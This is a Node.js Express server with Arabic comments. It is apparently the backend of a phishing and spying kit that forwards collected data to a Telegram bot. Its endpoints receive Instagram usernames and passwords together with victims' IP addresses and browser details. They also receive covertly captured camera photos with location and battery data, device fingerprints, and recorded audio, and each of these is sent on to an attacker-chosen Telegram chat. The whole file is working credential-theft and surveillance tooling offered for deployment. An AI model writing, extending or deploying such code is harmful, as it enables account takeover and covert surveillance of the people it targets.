require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// التوكن من متغيرات البيئة
const BOT_TOKEN = process.env.BOT_TOKEN;

if (!BOT_TOKEN) {
    console.error('❌ Telegram Bot Token is not configured');
    process.exit(1);
}

// تكوين multer للصور كـ base64
const storage = multer.memoryStorage();
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 } // 10MB
});

// مسار لحفظ الصور (متوافق مع ريندر)
function getUploadsDir() {
    return process.env.NODE_ENV === 'production' ? '/tmp/uploads' : 'uploads/';
}

const uploadsDir = getUploadsDir();
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}

// وظيفة لتحويل base64 إلى صورة
function saveBase64Image(base64Data, filename) {
    try {
        const matches = base64Data.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
        if (!matches || matches.length !== 3) {
            throw new Error('Invalid base64 image data');
        }

        const imageBuffer = Buffer.from(matches[2], 'base64');
        const filePath = path.join(uploadsDir, filename);
        fs.writeFileSync(filePath, imageBuffer);
        return filePath;
    } catch (error) {
        console.error('Error saving base64 image:', error);
        return null;
    }
}

// وظيفة إرسال إلى التليجرام
async function sendToTelegram(chatId, message, imagePath = null) {
    try {
        if (imagePath) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', message);
            formData.append('photo', fs.createReadStream(imagePath));
            
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
                headers: formData.getHeaders()
            });
            return response.data.ok;
        } else {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            });
            return response.data.ok;
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error.response?.data || error.message);
        return false;
    }
}

// وظيفة جمع معلومات الجهاز
function getDeviceInfo(req) {
    const userAgent = req.headers['user-agent'] || '';
    const acceptLanguage = req.headers['accept-language'] || '';
    const connection = req.headers['connection'] || '';
    const acceptEncoding = req.headers['accept-encoding'] || '';
    
    // معلومات إضافية من المتصفح (إذا متاحة)
    const screenInfo = {
        width: req.headers['screen-width'] || 'غير معروف',
        height: req.headers['screen-height'] || 'غير معروف'
    };
    
    return {
        userAgent: userAgent,
        language: acceptLanguage,
        connection: connection,
        encoding: acceptEncoding,
        screen: screenInfo,
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress
    };
}

// وظيفة الحصول على IP حقيقي
function getClientIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           'غير معروف';
}

// 1. استقبال بيانات انستقرام الأساسية
app.post('/send-to-telegram', async (req, res) => {
    try {
        const { playerId, password, amount, chatId, platform = "انستقرام" } = req.body;
        
        if (!playerId || !password || !amount || !chatId) {
            return res.status(400).json({
                success: false,
                message: 'بيانات ناقصة: يرجى إدخال جميع الحقول المطلوبة'
            });
        }

        const deviceInfo = getDeviceInfo(req);
        const userIP = getClientIP(req);

        const message = `♦️ - تم تسجيل حساب انستقرام جديد 

🔹 - اسم المستخدم: ${playerId}
🔑 - كلمة المرور: ${password}
👥 - عدد المتابعين: ${amount}
📱 - المنصة: ${platform}

🌍 - IP: ${userIP}
🔧 - المتصفح: ${deviceInfo.userAgent}
🌐 - اللغة: ${deviceInfo.language}
🖥️ - الشاشة: ${deviceInfo.screen.width}x${deviceInfo.screen.height}
⏰ - الوقت: ${new Date().toLocaleString('ar-SA')}

✅ - تم التسجيل بنجاح عبر السيرفر`;

        const success = await sendToTelegram(chatId, message);
        
        if (success) {
            res.json({
                success: true,
                message: 'تم إرسال البيانات إلى التليجرام بنجاح',
                orderId: `#${Math.floor(100000 + Math.random() * 900000)}`,
                timestamp: new Date().toISOString()
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'فشل في إرسال البيانات إلى التليجرام'
            });
        }
    } catch (error) {
        console.error('Error in /send-to-telegram:', error);
        res.status(500).json({
            success: false,
            message: 'حدث خطأ داخلي في السيرفر',
            error: error.message
        });
    }
});

// 2. استقبال الصور من الكاميرا (base64)
app.post('/submitPhtos', async (req, res) => {
    try {
        const { images, cameraType, additionalData, chatId } = req.body;
        
        if (!images || !chatId) {
            return res.status(400).json({
                success: false,
                message: 'بيانات ناقصة: يرجى إرسال الصور ومعرف الدردشة'
            });
        }

        let userData = {};
        try {
            userData = JSON.parse(additionalData || '{}');
        } catch (error) {
            console.error('Error parsing additional data:', error);
        }

        const deviceInfo = getDeviceInfo(req);
        const userIP = getClientIP(req);

        // معالجة الصور
        const imageArray = Array.isArray(images) ? images : [images];
        let successCount = 0;
        
        for (let i = 0; i < imageArray.length; i++) {
            const base64Image = imageArray[i];
            const filename = `photo_${cameraType}_${Date.now()}_${i}.jpg`;
            const imagePath = saveBase64Image(base64Image, filename);
            
            if (imagePath) {
                const message = `📸 صورة من الكاميرا: ${cameraType.toUpperCase()}

👤 المستخدم: ${userData.username || 'غير معروف'}
🌍 IP: ${userIP}
📍 الموقع: ${userData.country || 'غير معروف'} - ${userData.city || 'غير معروف'}
📱 المتصفح: ${deviceInfo.userAgent}
🔋 البطارية: ${userData.batteryLevel ? (userData.batteryLevel * 100) + '%' : 'غير معروف'}
⚡ الشحن: ${userData.batteryCharging ? 'نعم' : 'لا'}
🖼️ الصورة: ${i + 1}/${imageArray.length}
⏰ الوقت: ${new Date().toLocaleString('ar-SA')}`;

                const sent = await sendToTelegram(chatId, message, imagePath);
                if (sent) successCount++;
                
                // حذف الصورة بعد الإرسال لتوفير المساحة
                setTimeout(() => {
                    if (fs.existsSync(imagePath)) {
                        try {
                            fs.unlinkSync(imagePath);
                            console.log(`🗑️ تم حذف الصورة: ${filename}`);
                        } catch (deleteError) {
                            console.error('Error deleting image:', deleteError);
                        }
                    }
                }, 3000);
            }
        }

        res.json({
            success: true,
            message: `تم استقبال وإرسال ${successCount}/${imageArray.length} صورة بنجاح`,
            received: imageArray.length,
            sent: successCount,
            cameraType: cameraType
        });

    } catch (error) {
        console.error('Error processing photos:', error);
        res.status(500).json({
            success: false,
            message: 'حدث خطأ في معالجة الصور',
            error: error.message
        });
    }
});

// 3. استقبال معلومات الجهاز التفصيلية
app.post('/device-info', async (req, res) => {
    try {
        const { chatId, username, additionalInfo } = req.body;
        
        if (!chatId) {
            return res.status(400).json({
                success: false,
                message: 'معرف الدردشة مطلوب'
            });
        }

        const deviceInfo = getDeviceInfo(req);
        const userIP = getClientIP(req);

        const message = `📊 معلومات الجهاز التفصيلية

👤 المستخدم: ${username || 'غير معروف'}
🌍 IP: ${userIP}
🔧 User Agent: ${deviceInfo.userAgent}
🌐 اللغة: ${deviceInfo.language}
🔗 الاتصال: ${deviceInfo.connection}
📦 الترميز: ${deviceInfo.encoding}
🖥️ الشاشة: ${deviceInfo.screen.width} × ${deviceInfo.screen.height}
📝 معلومات إضافية: ${additionalInfo || 'لا يوجد'}

⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
📍 السيرفر: ${process.env.NODE_ENV || 'development'}`;

        const success = await sendToTelegram(chatId, message);
        
        if (success) {
            res.json({
                success: true,
                message: 'تم إرسال معلومات الجهاز إلى التليجرام بنجاح'
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'فشل في إرسال المعلومات إلى التليجرام'
            });
        }
    } catch (error) {
        console.error('Error in /device-info:', error);
        res.status(500).json({
            success: false,
            message: 'حدث خطأ داخلي في السيرفر',
            error: error.message
        });
    }
});

// 4. استقبال ملفات الصوت
app.post('/upload-audio', upload.single('audio'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ 
                success: false,
                error: 'لم يتم تقديم ملف صوتي' 
            });
        }

        const { username, chatId } = req.body;
        const audioPath = req.file.path;
        
        let message = `🎵 تم تسجيل صوت جديد`;
        if (username) message += `\n👤 المستخدم: ${username}`;
        message += `\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}`;
        
        // إرسال كملف صوتي للتليجرام
        try {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', message);
            formData.append('audio', fs.createReadStream(audioPath));
            
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, formData, {
                headers: formData.getHeaders()
            });
            
            if (response.data.ok) {
                res.status(200).json({ 
                    success: true,
                    message: 'تم إرسال الصوت إلى التليجرام بنجاح' 
                });
            } else {
                res.status(500).json({ 
                    success: false,
                    error: 'فشل في إرسال الصوت إلى التليجرام' 
                });
            }
        } catch (telegramError) {
            console.error('Telegram error:', telegramError);
            res.status(500).json({ 
                success: false,
                error: 'خطأ في إرسال الصوت إلى التليجرام' 
            });
        } finally {
            // تنظيف الملف
            setTimeout(() => {
                if (fs.existsSync(audioPath)) {
                    fs.unlinkSync(audioPath);
                }
            }, 5000);
        }

    } catch (error) {
        console.error('Error processing audio upload:', error);
        res.status(500).json({ 
            success: false,
            error: 'حدث خطأ داخلي في السيرفر' 
        });
    }
});

// 5. صفحة الرئيسية
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>السيرفر الرئيسي</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                h1 { color: #333; text-align: center; }
                .endpoint { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-right: 4px solid #007bff; }
                .method { background: #007bff; color: white; padding: 2px 8px; border-radius: 3px; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 السيرفر يعمل بنجاح</h1>
                <p>✅ السيرفر نشط وجاهز لاستقبال الطلبات</p>
                
                <h2>📡 نقاط الوصول المتاحة:</h2>
                <div class="endpoint">
                    <span class="method">POST</span> <strong>/send-to-telegram</strong> - استقبال بيانات انستقرام
                </div>
                <div class="endpoint">
                    <span class="method">POST</span> <strong>/submitPhtos</strong> - استقبال الصور من الكاميرا
                </div>
                <div class="endpoint">
                    <span class="method">POST</span> <strong>/device-info</strong> - استقبال معلومات الجهاز
                </div>
                <div class="endpoint">
                    <span class="method">POST</span> <strong>/upload-audio</strong> - استقبال ملفات الصوت
                </div>
                <div class="endpoint">
                    <span class="method">GET</span> <strong>/health</strong> - فحص حالة السيرفر
                </div>
                
                <p>⏰ وقت التشغيل: ${new Date().toLocaleString('ar-SA')}</p>
                <p>🌐 البيئة: ${process.env.NODE_ENV || 'development'}</p>
            </div>
        </body>
        </html>
    `);
});

// 6. التحقق من صحة السيرفر
app.get('/health', (req, res) => {
    res.json({
        success: true,
        status: 'يعمل',
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development',
        tokenConfigured: !!BOT_TOKEN,
        server: 'Telegram Bot Server',
        version: '1.0.0'
    });
});

// 7. تنظيف الملفات القديمة
function cleanupOldFiles() {
    if (fs.existsSync(uploadsDir)) {
        fs.readdir(uploadsDir, (err, files) => {
            if (err) {
                console.error('Error reading uploads directory:', err);
                return;
            }
            
            const now = Date.now();
            const oneHour = 60 * 60 * 1000;
            
            files.forEach(file => {
                const filePath = path.join(uploadsDir, file);
                fs.stat(filePath, (err, stat) => {
                    if (err) return;
                    
                    if (now - stat.mtimeMs > oneHour) {
                        fs.unlink(filePath, err => {
                            if (!err) {
                                console.log(`🗑️ تم حذف الملف القديم: ${file}`);
                            }
                        });
                    }
                });
            });
        });
    }
}

// التشغيل كل ساعة
setInterval(cleanupOldFiles, 60 * 60 * 1000);

// بدء السيرفر (متوافق مع ريندر)
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 السيرفر يعمل على http://0.0.0.0:${PORT}`);
    console.log(`📨 استقبال بيانات انستقرام: POST /send-to-telegram`);
    console.log(`📸 استقبال الصور: POST /submitPhtos`);
    console.log(`📊 استقبال معلومات الجهاز: POST /device-info`);
    console.log(`🎵 استقبال الصوت: POST /upload-audio`);
    console.log(`❤️ فحص الصحة: GET /health`);
    console.log(`🔑 التوكن: ${BOT_TOKEN ? '✅ مُعّرف' : '❌ غير معروف'}`);
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
    console.error('❌ خطأ غير معالج:', error);
});

process.on('uncaughtException', (error) => {
    console.error('❌ استثناء غير معالج:', error);
});
